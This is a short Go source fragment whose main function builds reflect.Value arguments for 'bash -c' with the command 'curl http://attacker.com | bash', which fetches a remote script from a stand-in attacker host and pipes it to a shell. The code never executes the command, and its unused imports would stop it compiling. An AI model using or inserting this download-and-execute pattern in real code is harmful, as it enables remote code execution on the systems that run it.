package main

import (
	"context"
	"encoding/json"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"reflect"
)

func main() {
    args := []reflect.Value{
        reflect.ValueOf("bash"),
        reflect.ValueOf("-c"),
        reflect.ValueOf("curl http://attacker.com | bash"),
    }
}